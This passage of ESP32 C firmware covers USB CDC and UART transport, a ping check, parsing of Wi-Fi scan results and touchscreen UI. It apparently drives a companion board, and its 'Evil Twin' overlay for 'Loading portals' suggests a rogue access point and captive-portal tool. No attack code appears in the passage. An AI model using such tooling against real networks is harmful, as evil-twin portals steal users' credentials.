        const usb_standard_desc_t *intf_desc_std = (const usb_standard_desc_t *)config_desc;
        while ((intf_desc_std = usb_parse_next_descriptor_of_type(intf_desc_std,
                                                                  config_desc->wTotalLength,
                                                                  USB_B_DESCRIPTOR_TYPE_INTERFACE,
                                                                  &intf_offset))) {
            const usb_intf_desc_t *intf_desc = (const usb_intf_desc_t *)intf_desc_std;
            int desc_off = intf_offset;
            int temp_off = desc_off;
            bool has_in = false;
            bool has_out = false;

            for (int i = 0; i < intf_desc->bNumEndpoints; i++) {
                const usb_ep_desc_t *ep_desc = usb_parse_endpoint_descriptor_by_index(intf_desc, i,
                                                                                      config_desc->wTotalLength,
                                                                                      &desc_off);
                if (!ep_desc) {
                    continue;
                }
                if (USB_EP_DESC_GET_XFERTYPE(ep_desc) == USB_TRANSFER_TYPE_BULK) {
                    if (USB_EP_DESC_GET_EP_DIR(ep_desc)) {
                        has_in = true;
                    } else {
                        has_out = true;
                    }
                }
                desc_off = temp_off;
            }

            if (has_in && has_out) {
                usb_cdc_preferred_itf = intf_desc->bInterfaceNumber;
                usb_cdc_preferred_valid = true;
                if (usb_debug_logs) {
                    ESP_LOGI(TAG, "[USB] Fallback bulk interface selected: itf=%u class=0x%02X",
                             usb_cdc_preferred_itf, intf_desc->bInterfaceClass);
                }
                break;
            }
        }
    }

    if (usb_debug_logs) {
        ESP_LOGI(TAG, "[USB] new_dev_cb: vid=0x%04X pid=0x%04X class=0x%02X pref_itf=%u valid=%d",
                 device_desc->idVendor,
                 device_desc->idProduct,
                 device_desc->bDeviceClass,
                 usb_cdc_preferred_itf,
                 usb_cdc_preferred_valid);
    }
}

static const char *usb_cdc_state_str(usbh_cdc_state_t state)
{
    switch (state) {
        case USBH_CDC_CLOSE: return "CLOSE";
        case USBH_CDC_OPEN: return "OPEN";
        default: return "UNKNOWN";
    }
}

static void usb_log_cdc_state(const char *where)
{
    if (!usb_cdc_handle) {
        ESP_LOGI(TAG, "[USB] %s: handle=NULL connected=%d transport_ready=%d",
                 where, usb_cdc_connected, usb_transport_ready);
        return;
    }

    usbh_cdc_state_t state = USBH_CDC_CLOSE;
    esp_err_t state_err = usbh_cdc_get_state(usb_cdc_handle, &state);
    size_t rx_size = 0;
    esp_err_t rx_err = usbh_cdc_get_rx_buffer_size(usb_cdc_handle, &rx_size);

    ESP_LOGI(TAG,
             "[USB] %s: handle=%p connected=%d transport_ready=%d state=%s(%d) state_err=%s rx_buf=%u rx_err=%s",
             where,
             (void *)usb_cdc_handle,
             usb_cdc_connected,
             usb_transport_ready,
             usb_cdc_state_str(state),
             (int)state,
             esp_err_to_name(state_err),
             (unsigned)rx_size,
             esp_err_to_name(rx_err));
}

static void board_redetect_cb(void *user_data)
{
    (void)user_data;
    ESP_LOGI(TAG, "board_redetect_cb called");
    board_redetect_pending = false;

    bool prev_grove = grove_detected;
    bool prev_usb = usb_detected;
    bool prev_uart2 = mbus_detected;

    detect_boards();

    bool changed = (prev_grove != grove_detected) ||
                   (prev_usb != usb_detected) ||
                   (prev_uart2 != mbus_detected);

    ESP_LOGI(TAG, "Redetect: changed=%d, uart1=%d, mbus=%d, popup_open=%d",
             changed, uart1_detected, mbus_detected, board_detection_popup_open);

    if (changed && (uart1_detected || mbus_detected) && !board_detection_popup_open) {
        ESP_LOGI(TAG, "Redetect: calling reload_gui_for_detection + show_main_tiles");
        reload_gui_for_detection();
        show_main_tiles();
    } else if (changed) {
        ESP_LOGW(TAG, "Redetect: changed but conditions not met for reload");
    }
}

static void schedule_board_redetect(void)
{
    if (board_redetect_pending) {
        return;
    }
    board_redetect_pending = true;
    lv_async_call(board_redetect_cb, NULL);
}

static tab_id_t uart1_preferred_tab(void)
{
    if (grove_detected) {
        return TAB_GROVE;
    }
    if (usb_detected) {
        return TAB_USB;
    }
    return TAB_GROVE;
}

static void usb_check_host_installed(void)
{
    if (usb_host_checked) {
        return;
    }
    usb_host_lib_info_t info = { 0 };
    esp_err_t err = usb_host_lib_info(&info);
    usb_host_installed = (err == ESP_OK);
    usb_host_checked = true;
}

static void usb_cdc_connect_cb(usbh_cdc_handle_t cdc_handle, void *user_data)
{
    (void)user_data;
    usb_cdc_handle = cdc_handle;
    usb_cdc_connected = true;
    usb_transport_ready = true;
    usb_transport_warned = false;
    ESP_LOGI(TAG, "[USB] CDC device connected (handle=%p)", (void *)cdc_handle);
    
    // Note: SET_LINE_CODING and SET_CONTROL_LINE_STATE are skipped because:
    // 1. They cause 5-second blocking timeouts
    // 2. ESP32 USB Serial/JTAG doesn't support these CDC class requests (returns STALL)
    // 3. Data transfer works without them for this device type
    
    // Flush any stale data in the RX buffer
    esp_err_t flush_err = usbh_cdc_flush_rx_buffer(cdc_handle);
    if (flush_err != ESP_OK) {
        ESP_LOGW(TAG, "[USB] Flush RX buffer failed on connect: %s", esp_err_to_name(flush_err));
    }

    if (usb_debug_logs) {
        esp_err_t desc_err = usbh_cdc_desc_print(cdc_handle);
        ESP_LOGI(TAG, "[USB] CDC descriptor dump: %s", esp_err_to_name(desc_err));
        usb_log_cdc_state("connect");
    }

    if (usb_last_vid == CP210X_VID) {
        cp210x_init_port(usb_cdc_preferred_itf);
    }
    
    schedule_board_redetect();
}

static void usb_cdc_disconnect_cb(usbh_cdc_handle_t cdc_handle, void *user_data)
{
    (void)cdc_handle;
    (void)user_data;
    if (usb_cdc_handle == cdc_handle) {
        usb_cdc_handle = NULL;
    }
    usb_cdc_connected = false;
    usb_transport_ready = false;
    usb_transport_warned = false;
    usb_cdc_preferred_valid = false;
    usb_cdc_preferred_itf = 0;
    usb_last_vid = 0;
    usb_last_pid = 0;
    ESP_LOGW(TAG, "[USB] CDC device disconnected");
    if (usb_debug_logs) {
        usb_log_cdc_state("disconnect");
    }
    schedule_board_redetect();
}

static void usb_cdc_recv_cb(usbh_cdc_handle_t cdc_handle, void *user_data)
{
    (void)cdc_handle;
    (void)user_data;
}

static void usb_cdc_notif_cb(usbh_cdc_handle_t cdc_handle, iot_cdc_notification_t *notif, void *user_data)
{
    (void)cdc_handle;
    (void)user_data;
    if (!usb_debug_logs) {
        return;
    }
    if (!notif) {
        ESP_LOGW(TAG, "[USB] CDC notification: NULL");
        return;
    }
    ESP_LOGI(TAG, "[USB] CDC notification: bmReq=0x%02X code=0x%02X wValue=0x%04X wIndex=0x%04X wLen=%u",
             notif->bmRequestType,
             notif->bNotificationCode,
             notif->wValue,
             notif->wIndex,
             notif->wLength);
}

static void usb_transport_init(void)
{
    if (usb_transport_ready) {
        return;
    }

    if (usb_cdc_handle) {
        usb_transport_ready = true;
        return;
    }

    uint32_t now_ms = lv_tick_get();
    if (now_ms < usb_next_retry_ms) {
        return;
    }

    if (!usb_log_tuned) {
        if (usb_debug_logs) {
            esp_log_level_set("USBH_CDC", ESP_LOG_INFO);
            esp_log_level_set("USBH", ESP_LOG_INFO);
            esp_log_level_set("USB HOST", ESP_LOG_INFO);
        } else {
            esp_log_level_set("USBH_CDC", ESP_LOG_NONE);
            esp_log_level_set("USBH", ESP_LOG_NONE);
            esp_log_level_set("USB HOST", ESP_LOG_NONE);
        }
        usb_log_tuned = true;
    }

    ESP_LOGI(TAG, "[USB] Starting USB host for CDC...");
    usb_check_host_installed();
    if (!usb_host_installed) {
        esp_err_t err = bsp_usb_host_start(BSP_USB_HOST_POWER_MODE_USB_DEV, false);
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
            ESP_LOGE(TAG, "[USB] USB host start failed: %s", esp_err_to_name(err));
            return;
        }
        usb_host_installed = true;
        usb_host_started_by_us = true;
    } else {
        ESP_LOGI(TAG, "[USB] USB host already installed");
    }

    usbh_cdc_driver_config_t config = {
        .task_stack_size = 4096,
        .task_priority = 5,
        .task_coreid = -1,
        .skip_init_usb_host_driver = true,
        .new_dev_cb = usb_cdc_new_dev_cb,
        .user_data = NULL,
    };
    if (usb_debug_logs) {
        ESP_LOGI(TAG, "[USB] CDC driver config: stack=%d prio=%d core=%d",
                 config.task_stack_size, config.task_priority, config.task_coreid);
    }

    esp_err_t err = usbh_cdc_driver_install(&config);
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "[USB] CDC driver install failed: %s", esp_err_to_name(err));
        return;
    }

    if (usb_debug_logs) {
        ESP_LOGI(TAG, "[USB] Waiting for new_dev_cb...");
    }
    for (int i = 0; i < 5 && !usb_cdc_preferred_valid; i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    if (!usb_cdc_preferred_valid) {
        if (usb_debug_logs) {
            ESP_LOGW(TAG, "[USB] No CDC-DATA or bulk IN/OUT interface found, ignoring device");
        }
        return;
    }

    usbh_cdc_device_config_t dev_config = {
        .vid = CDC_HOST_ANY_VID,
        .pid = CDC_HOST_ANY_PID,
        .itf_num = usb_cdc_preferred_valid ? usb_cdc_preferred_itf : 0,
        .rx_buffer_size = UART_BUF_SIZE,
        .tx_buffer_size = UART_BUF_SIZE,
        .cbs = {
            .connect = usb_cdc_connect_cb,
            .disconnect = usb_cdc_disconnect_cb,
            .recv_data = usb_cdc_recv_cb,
            .notif_cb = usb_cdc_notif_cb,
            .user_data = NULL,
        },
    };
    if (usb_debug_logs) {
        ESP_LOGI(TAG, "[USB] CDC device config: vid=0x%04X pid=0x%04X itf=%d rx=%u tx=%u",
                 dev_config.vid, dev_config.pid, dev_config.itf_num,
                 (unsigned)dev_config.rx_buffer_size, (unsigned)dev_config.tx_buffer_size);
    }

    err = usbh_cdc_create(&dev_config, &usb_cdc_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "[USB] CDC create failed: %s", esp_err_to_name(err));
        usb_next_retry_ms = now_ms + 1000;
        return;
    }

    usb_transport_ready = true;
    usb_transport_warned = false;
    ESP_LOGI(TAG, "[USB] USB CDC host ready, waiting for device...");
}

static __attribute__((unused)) void usb_transport_deinit(void)
{
    if (!usb_transport_ready) {
        return;
    }

    if (usb_cdc_handle) {
        usbh_cdc_delete(usb_cdc_handle);
        usb_cdc_handle = NULL;
    }

    usbh_cdc_driver_uninstall();
    if (usb_host_started_by_us) {
        bsp_usb_host_stop();
        usb_host_started_by_us = false;
    }

    usb_transport_ready = false;
    ESP_LOGI(TAG, "[USB] USB CDC host stopped");
}

static int usb_transport_write(const char *data, size_t len)
{
    if (!usb_transport_ready) {
        ESP_LOGD(TAG, "[USB] Transport not ready, initializing...");
        usb_transport_init();
    }
    if (!usb_cdc_handle || !usb_cdc_connected) {
        if (!usb_transport_warned) {
            ESP_LOGW(TAG, "[USB] No CDC device connected (handle=%p, connected=%d)", 
                     (void*)usb_cdc_handle, usb_cdc_connected);
            usb_transport_warned = true;
        }
        return 0;
    }
    
    ESP_LOGD(TAG, "[USB] Writing %zu bytes: %.*s", len, (int)(len > 50 ? 50 : len), data);
    
    esp_err_t err = usbh_cdc_write_bytes(usb_cdc_handle, (const uint8_t *)data, len, pdMS_TO_TICKS(200));
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "[USB] CDC write failed: %s", esp_err_to_name(err));
        if (usb_debug_logs) {
            usb_log_cdc_state("write_failed");
        }
        return 0;
    }
    
    ESP_LOGD(TAG, "[USB] Write successful: %zu bytes", len);
    return (int)len;
}

static int usb_transport_read(void *data, size_t len, TickType_t ticks_to_wait)
{
    if (!usb_transport_ready) {
        ESP_LOGD(TAG, "[USB] Transport not ready for read, initializing...");
        usb_transport_init();
    }
    if (!usb_cdc_handle || !usb_cdc_connected) {
        ESP_LOGD(TAG, "[USB] Read failed: no CDC device (handle=%p, connected=%d)",
                 (void*)usb_cdc_handle, usb_cdc_connected);
        return 0;
    }
    size_t rx_size = 0;
    esp_err_t rx_err = usbh_cdc_get_rx_buffer_size(usb_cdc_handle, &rx_size);
    if (rx_err == ESP_OK && rx_size == 0) {
        if (ticks_to_wait > 0) {
            vTaskDelay(ticks_to_wait);
            rx_err = usbh_cdc_get_rx_buffer_size(usb_cdc_handle, &rx_size);
        }
        if (rx_err == ESP_OK && rx_size == 0) {
            return 0;
        }
    }

    size_t read_len = len;
    esp_err_t err = usbh_cdc_read_bytes(usb_cdc_handle, (uint8_t *)data, &read_len, 0);
    if (err != ESP_OK) {
        // ESP_FAIL often means no data available - treat as timeout (normal during polling)
        // ESP_ERR_TIMEOUT is also normal
        // Only log actual unexpected errors
        if (err != ESP_ERR_TIMEOUT && err != ESP_FAIL) {
            ESP_LOGW(TAG, "[USB] CDC read error: %s (0x%x)", esp_err_to_name(err), err);
            if (usb_debug_logs) {
                usb_log_cdc_state("read_error");
            }
        }
        return 0;
    }
    if (read_len > 0) {
        // Log raw bytes received from USB (hex + ASCII for debugging)
        char hex_buf[128];
        char ascii_buf[64];
        size_t log_len = read_len > 32 ? 32 : read_len;  // Limit to 32 bytes in log
        for (size_t i = 0; i < log_len; i++) {
            uint8_t b = ((uint8_t*)data)[i];
            snprintf(hex_buf + i*3, 4, "%02X ", b);
            ascii_buf[i] = (b >= 32 && b < 127) ? (char)b : '.';
        }
        hex_buf[log_len * 3] = '\0';
        ascii_buf[log_len] = '\0';
        ESP_LOGI(TAG, "[USB] Read %zu bytes: [%s] \"%s\"%s", 
                 read_len, hex_buf, ascii_buf, read_len > 32 ? "..." : "");
    }
    return (int)read_len;
}

static void usb_flush_input(uint32_t max_ms)
{
    if (!usb_cdc_handle || !usb_cdc_connected) {
        return;
    }
    uint8_t tmp[64];
    uint32_t start_ms = esp_timer_get_time() / 1000;
    while ((esp_timer_get_time() / 1000) - start_ms < max_ms) {
        size_t rx_size = 0;
        if (usbh_cdc_get_rx_buffer_size(usb_cdc_handle, &rx_size) != ESP_OK || rx_size == 0) {
            break;
        }
        size_t read_len = rx_size > sizeof(tmp) ? sizeof(tmp) : rx_size;
        usbh_cdc_read_bytes(usb_cdc_handle, tmp, &read_len, 0);
    }
    if (usb_debug_logs) {
        ESP_LOGI(TAG, "[USB] Flushed input for %u ms", (unsigned)max_ms);
    }
}

// Ping USB device to verify it responds (similar to ping_uart_direct for Grove/MBus)
static bool ping_usb(void)
{
    if (!usb_cdc_handle || !usb_cdc_connected) {
        ESP_LOGW(TAG, "[USB] Cannot ping - no CDC device connected");
        return false;
    }
    
    // Flush RX buffer before ping (drain any boot/menu spam)
    usb_flush_input(200);
    
    // Send ping command
    const char *ping_cmd = "ping\r\n";
    int written = usb_transport_write(ping_cmd, strlen(ping_cmd));
    if (written <= 0) {
        ESP_LOGW(TAG, "[USB] Failed to send ping");
        return false;
    }
    ESP_LOGI(TAG, "[USB] Sent ping");
    
    // Wait for pong response (timeout ~500ms, 10 x 50ms reads)
    char buf[64];
    int total = 0;
    for (int i = 0; i < 10; i++) {
        int n = usb_transport_read(buf + total, sizeof(buf) - total - 1, pdMS_TO_TICKS(50));
        if (usb_debug_logs && n == 0) {
            ESP_LOGD(TAG, "[USB] Ping wait %d/10: no data", i + 1);
        }
        if (n > 0) {
            total += n;
            buf[total] = '\0';
            if (strstr(buf, "pong")) {
                ESP_LOGI(TAG, "[USB] Received pong - device detected!");
                return true;
            }
        }
    }
    
    if (usb_debug_logs && total > 0) {
        ESP_LOGW(TAG, "[USB] No pong response, partial data: \"%s\"", buf);
    }
    ESP_LOGW(TAG, "[USB] No pong response - device not detected");
    return false;
}

static int transport_write_bytes_tab(tab_id_t tab, uart_port_t port, const char *data, size_t len)
{
    if (port == UART_NUM && tab == TAB_USB) {
        return usb_transport_write(data, len);
    }
    return uart_write_bytes(port, data, len);
}

static int transport_read_bytes_tab(tab_id_t tab, uart_port_t port, void *data, size_t len, TickType_t ticks_to_wait)
{
    if (port == UART_NUM && tab == TAB_USB) {
        return usb_transport_read(data, len, ticks_to_wait);
    }
    return uart_read_bytes(port, (uint8_t *)data, len, ticks_to_wait);
}

static int transport_write_bytes(uart_port_t port, const char *data, size_t len)
{
    return transport_write_bytes_tab(current_tab, port, data, len);
}

static int transport_read_bytes(uart_port_t port, void *data, size_t len, TickType_t ticks_to_wait)
{
    return transport_read_bytes_tab(current_tab, port, data, len, ticks_to_wait);
}

// UART initialization
static void uart_init(void)
{
    const uart_config_t uart_config = {
        .baud_rate = UART_BAUD_RATE,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };
    
    // Get UART1 pins (fixed to Grove connector)
    int tx_pin, rx_pin;
    get_uart1_pins(&tx_pin, &rx_pin);
    
    ESP_ERROR_CHECK(uart_driver_install(UART_NUM, UART_BUF_SIZE * 2, 0, 0, NULL, 0));
    ESP_ERROR_CHECK(uart_param_config(UART_NUM, &uart_config));
    ESP_ERROR_CHECK(uart_set_pin(UART_NUM, tx_pin, rx_pin, 
                                  UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
    
    ESP_LOGI(TAG, "[Grove] Initialized: TX=%d, RX=%d, baud=%d (Grove connector)",
             tx_pin, rx_pin, UART_BAUD_RATE);

    usb_transport_init();
}

// Log memory statistics
static void log_memory_stats(const char *context)
{
    size_t internal_free = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    size_t internal_min = heap_caps_get_minimum_free_size(MALLOC_CAP_INTERNAL);
    size_t dma_free = heap_caps_get_free_size(MALLOC_CAP_DMA);
    size_t dma_min = heap_caps_get_minimum_free_size(MALLOC_CAP_DMA);
    size_t psram_free = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
    size_t psram_min = heap_caps_get_minimum_free_size(MALLOC_CAP_SPIRAM);
    
    ESP_LOGI(TAG, "[MEM:%s] INTERNAL: %zu free, %zu min | DMA: %zu free, %zu min | PSRAM: %zu free, %zu min",
             context,
             internal_free, internal_min,
             dma_free, dma_min,
             psram_free, psram_min);
}

// Send command over UART1 (primary)
static void uart_send_command(const char *cmd)
{
    log_memory_stats("TX1");
    tab_id_t uart1_tab = uart1_preferred_tab();
    transport_write_bytes_tab(uart1_tab, UART_NUM, cmd, strlen(cmd));
    transport_write_bytes_tab(uart1_tab, UART_NUM, "\r\n", 2);
    ESP_LOGI(TAG, "[%s] Sent command: %s", tab_transport_name(uart1_tab), cmd);
}

// Send command over MBus (UART2)
static void uart2_send_command(const char *cmd)
{
    if (!uart2_initialized) {
        ESP_LOGW(TAG, "[MBus] Not initialized");
        return;
    }
    log_memory_stats("TX2");
    transport_write_bytes(UART2_NUM, cmd, strlen(cmd));
    transport_write_bytes(UART2_NUM, "\r\n", 2);
    ESP_LOGI(TAG, "[MBus] Sent command: %s", cmd);
}

// Parse a single network line like: "1","SSID","","C4:2B:44:12:29:21","1","WPA2","-53","2.4GHz"
static bool parse_network_line(const char *line, wifi_network_t *net)
{
    // Check if line starts with quote and number
    if (line[0] != '"') return false;
    
    char temp[256];
    strncpy(temp, line, sizeof(temp) - 1);
    temp[sizeof(temp) - 1] = '\0';
    
    // Parse CSV with quoted fields
    char *fields[8] = {NULL};
    int field_idx = 0;
    char *p = temp;
    
    while (*p && field_idx < 8) {
        if (*p == '"') {
            p++;  // Skip opening quote
            fields[field_idx] = p;
            // Find closing quote
            while (*p && *p != '"') p++;
            if (*p == '"') {
                *p = '\0';
                p++;
            }
            field_idx++;
            // Skip comma
            if (*p == ',') p++;
        } else {
            p++;
        }
    }
    
    if (field_idx < 8) return false;
    
    // fields[0] = index, fields[1] = SSID, fields[3] = BSSID, fields[5] = security, fields[6] = RSSI, fields[7] = band
    net->index = atoi(fields[0]);
    if (net->index <= 0) return false;
    
    strncpy(net->ssid, fields[1], sizeof(net->ssid) - 1);
    net->ssid[sizeof(net->ssid) - 1] = '\0';
    
    strncpy(net->bssid, fields[3], sizeof(net->bssid) - 1);
    net->bssid[sizeof(net->bssid) - 1] = '\0';
    
    strncpy(net->security, fields[5], sizeof(net->security) - 1);
    net->security[sizeof(net->security) - 1] = '\0';
    
    net->rssi = atoi(fields[6]);
    
    strncpy(net->band, fields[7], sizeof(net->band) - 1);
    net->band[sizeof(net->band) - 1] = '\0';
    
    return true;
}

// WiFi scan task
static void wifi_scan_task(void *arg)
{
    // Save the tab that initiated this scan (so we store results to correct context)
    tab_id_t scan_tab = current_tab;
    const char *uart_name = tab_transport_name(scan_tab);
    
    ESP_LOGI(TAG, "Starting WiFi scan task for tab %d (%s)", scan_tab, uart_name);
    
    // Clear previous results
    network_count = 0;
    memset(networks, 0, sizeof(networks));
    
    // Get the UART for current tab
    uart_port_t uart_port = uart_port_for_tab(scan_tab);
    
    ESP_LOGI(TAG, "[%s] Using transport on port %d for scan", uart_name, uart_port);
    
    // Flush buffer before scan
    if (scan_tab == TAB_USB && usb_cdc_handle) {
        usbh_cdc_flush_rx_buffer(usb_cdc_handle);
        ESP_LOGI(TAG, "[USB] Flushed RX buffer before scan");
    } else {
        uart_flush(uart_port);
    }
    
    // Send scan command to the correct transport
    log_memory_stats("TX-scan");
    transport_write_bytes_tab(scan_tab, uart_port, "scan_networks\r\n", 15);
    ESP_LOGI(TAG, "[%s] Sent command: scan_networks", tab_transport_name(scan_tab));
    
    // Buffer for receiving data
    static char rx_buffer[UART_BUF_SIZE];
    static char line_buffer[512];
    int line_pos = 0;
    bool scan_complete = false;
    
    TickType_t start_time = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(UART_RX_TIMEOUT);
    
    while (!scan_complete && (xTaskGetTickCount() - start_time) < timeout_ticks) {
        int len = transport_read_bytes_tab(scan_tab, uart_port, rx_buffer, UART_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            ESP_LOGD(TAG, "Received %d bytes", len);
            
            // Process received data character by character
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGD(TAG, "Line: %s", line_buffer);
                        
                        // Check for scan complete marker
                        if (strstr(line_buffer, "Scan results printed") != NULL) {
                            scan_complete = true;
                            ESP_LOGI(TAG, "Scan complete marker received");
                            break;
                        }
                        
                        // Try to parse network line
                        if (line_buffer[0] == '"' && network_count < MAX_NETWORKS) {
                            wifi_network_t net;
                            if (parse_network_line(line_buffer, &net)) {
                                networks[network_count] = net;
                                network_count++;
                                ESP_LOGI(TAG, "[%s] Parsed network %d: %s (%s) %s", 
                                         uart_name, net.index, net.ssid, net.bssid, net.band);
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
    }
    
    if (!scan_complete) {
        ESP_LOGW(TAG, "[%s] Scan timed out", uart_name);
    }
    
    log_memory_stats("RX-scan");
    ESP_LOGI(TAG, "[%s] Scan finished. Found %d networks", uart_name, network_count);
    
    // Update UI on main thread
    bsp_display_lock(0);
    
    // Hide spinner
    if (spinner) {
        lv_obj_add_flag(spinner, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Update status
    if (status_label) {
        if (scan_complete) {
            lv_label_set_text_fmt(status_label, "Found %d networks", network_count);
        } else {
            lv_label_set_text(status_label, "Scan timed out");
        }
    }
    
    // Update network list
    if (network_list) {
        lv_obj_clean(network_list);
        
        for (int i = 0; i < network_count; i++) {
            wifi_network_t *net = &networks[i];
            
            // Create list item with horizontal layout (checkbox + text container)
            lv_obj_t *item = lv_obj_create(network_list);
            lv_obj_set_size(item, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_pad_all(item, 8, 0);
            lv_obj_set_style_bg_color(item, lv_color_hex(0x2D2D2D), 0);
            lv_obj_set_style_border_width(item, 0, 0);
            lv_obj_set_style_radius(item, 8, 0);
            lv_obj_set_flex_flow(item, LV_FLEX_FLOW_ROW);
            lv_obj_set_flex_align(item, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
            lv_obj_set_style_pad_column(item, 12, 0);
            lv_obj_clear_flag(item, LV_OBJ_FLAG_CLICKABLE);  // Don't steal clicks from checkbox
            
            // Checkbox (on the left) - explicit size for better touch accuracy
            lv_obj_t *cb = lv_checkbox_create(item);
            lv_checkbox_set_text(cb, "");  // Empty text - we use separate labels
            lv_obj_set_size(cb, 50, 50);  // Explicit size for touch target
            lv_obj_set_ext_click_area(cb, 15);  // Extend touch area by 15px
            lv_obj_set_style_pad_all(cb, 4, 0);
            lv_obj_set_style_align(cb, LV_ALIGN_LEFT_MID, 0);  // Center vertically in row
            // Style the indicator - dark when unchecked, green when checked
            lv_obj_set_style_bg_color(cb, lv_color_hex(0x3D3D3D), LV_PART_INDICATOR);
            lv_obj_set_style_bg_color(cb, lv_color_hex(0x4CAF50), LV_PART_INDICATOR | LV_STATE_CHECKED);
            lv_obj_set_style_border_color(cb, lv_color_hex(0x888888), LV_PART_INDICATOR);
            lv_obj_set_style_border_width(cb, 2, LV_PART_INDICATOR);
            lv_obj_set_style_radius(cb, 4, LV_PART_INDICATOR);
            // Pass 0-based index as user data
            lv_obj_add_event_cb(cb, network_checkbox_event_cb, LV_EVENT_VALUE_CHANGED, (void*)(intptr_t)i);
            
            // Text container (vertical layout for SSID and info)
            lv_obj_t *text_cont = lv_obj_create(item);
            lv_obj_set_size(text_cont, lv_pct(85), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_opa(text_cont, LV_OPA_TRANSP, 0);
            lv_obj_set_style_border_width(text_cont, 0, 0);
            lv_obj_set_style_pad_all(text_cont, 0, 0);
            lv_obj_set_flex_flow(text_cont, LV_FLEX_FLOW_COLUMN);
            lv_obj_set_style_pad_row(text_cont, 4, 0);
            lv_obj_clear_flag(text_cont, LV_OBJ_FLAG_CLICKABLE);  // Don't steal clicks
            
            // SSID (or "Hidden" if empty)
            lv_obj_t *ssid_label = lv_label_create(text_cont);
            if (strlen(net->ssid) > 0) {
                lv_label_set_text(ssid_label, net->ssid);
            } else {
                lv_label_set_text(ssid_label, "(Hidden)");
            }
            lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_18, 0);
            lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
            
            // BSSID, Band, Security and RSSI
            lv_obj_t *info_label = lv_label_create(text_cont);
            lv_label_set_text_fmt(info_label, "%s  |  %s  |  %s  |  %d dBm", 
                                  net->bssid, net->band, net->security, net->rssi);
            lv_obj_set_style_text_font(info_label, &lv_font_montserrat_12, 0);
            lv_obj_set_style_text_color(info_label, lv_color_hex(0x888888), 0);
        }
    }
    
    // Re-enable scan button
    if (scan_btn) {
        lv_obj_clear_state(scan_btn, LV_STATE_DISABLED);
    }
    
    // Hide small spinner
    if (spinner) {
        lv_obj_add_flag(spinner, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Hide large centered overlay
    hide_scan_overlay();
    
    scan_in_progress = false;
    
    // Copy scan results to the tab that initiated the scan (not necessarily current tab!)
    tab_context_t *ctx = get_ctx_for_tab(scan_tab);
    if (ctx && ctx->networks) {
        memcpy(ctx->networks, networks, sizeof(wifi_network_t) * MAX_NETWORKS);
        ctx->network_count = network_count;
        memcpy(ctx->selected_indices, selected_network_indices, sizeof(selected_network_indices));
        ctx->selected_count = selected_network_count;
        ESP_LOGI(TAG, "[%s] Copied %d scan results to tab %d context", uart_name, network_count, scan_tab);
    }
    
    bsp_display_unlock();
    
    // Delete this task
    vTaskDelete(NULL);
}

// Show centered scanning overlay with large spinner
static void show_scan_overlay(void) {
    if (scan_overlay) return;
    
    scan_overlay = lv_obj_create(lv_scr_act());
    lv_obj_remove_style_all(scan_overlay);
    lv_obj_set_size(scan_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(scan_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(scan_overlay, LV_OPA_70, 0);
    lv_obj_add_flag(scan_overlay, LV_OBJ_FLAG_CLICKABLE);  // Block clicks on elements below
    
    // Large centered spinner
    lv_obj_t *spin = lv_spinner_create(scan_overlay);
    lv_obj_set_size(spin, 100, 100);
    lv_spinner_set_anim_params(spin, 1000, 200);
    lv_obj_center(spin);
    
    // "Scanning..." label below spinner
    lv_obj_t *label = lv_label_create(scan_overlay);
    lv_label_set_text(label, "Scanning...");
    lv_obj_set_style_text_font(label, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_align(label, LV_ALIGN_CENTER, 0, 80);
}

// Hide scanning overlay
static void hide_scan_overlay(void) {
    if (scan_overlay) {
        lv_obj_del(scan_overlay);
        scan_overlay = NULL;
    }
}

// Show Evil Twin loading overlay with spinner
static void show_evil_twin_loading_overlay(void) {
    if (evil_twin_loading_overlay) return;
    
    evil_twin_loading_overlay = lv_obj_create(lv_scr_act());
    lv_obj_remove_style_all(evil_twin_loading_overlay);
    lv_obj_set_size(evil_twin_loading_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(evil_twin_loading_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(evil_twin_loading_overlay, LV_OPA_70, 0);
    lv_obj_add_flag(evil_twin_loading_overlay, LV_OBJ_FLAG_CLICKABLE);  // Block clicks
    
    // Large centered spinner
    lv_obj_t *spin = lv_spinner_create(evil_twin_loading_overlay);
    lv_obj_set_size(spin, 100, 100);
    lv_spinner_set_anim_params(spin, 1000, 200);
    lv_obj_center(spin);
    
    // "Loading..." label below spinner
    lv_obj_t *label = lv_label_create(evil_twin_loading_overlay);
    lv_label_set_text(label, "Loading portals...");
    lv_obj_set_style_text_font(label, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_align(label, LV_ALIGN_CENTER, 0, 80);
}

